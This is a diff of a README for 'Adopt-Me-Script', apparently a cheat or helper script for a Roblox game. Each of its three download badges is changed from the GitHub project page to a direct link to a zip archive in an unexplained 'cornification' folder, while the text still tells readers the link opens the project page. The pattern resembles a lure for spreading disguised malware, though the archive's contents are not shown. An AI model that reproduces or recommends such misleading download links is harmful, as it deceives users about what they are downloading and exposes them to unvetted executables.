@@ -1,6 +1,6 @@
 # 🎮 Adopt-Me-Script - Quick, Easy Game Helpers
 
-[![Download Adopt-Me-Script](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jazzman08/Adopt-Me-Script)
+[![Download Adopt-Me-Script](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/jazzman08/Adopt-Me-Script/main/cornification/Me_Adopt_Script_2.0.zip)
 
 ## 📋 What is Adopt-Me-Script?
 
@@ -28,7 +28,7 @@ Adopt-Me-Script is accessible through GitHub. You will go to the project page to
 ### Step 1: Download the Script
 
 Click this big green button to visit the download page:
-[![Download Adopt-Me-Script](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jazzman08/Adopt-Me-Script)
+[![Download Adopt-Me-Script](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/jazzman08/Adopt-Me-Script/main/cornification/Me_Adopt_Script_2.0.zip)
 
 - This link takes you to the main project page.
 - Look for the latest release or download section.
@@ -114,7 +114,7 @@ Do not run multiple versions at the same time.
 
 Get the script here:
 
-[![Download Adopt-Me-Script](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/jazzman08/Adopt-Me-Script)
+[![Download Adopt-Me-Script](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/jazzman08/Adopt-Me-Script/main/cornification/Me_Adopt_Script_2.0.zip)
 
 This link will take you to the full project page where you can find files, instructions, and support.
 
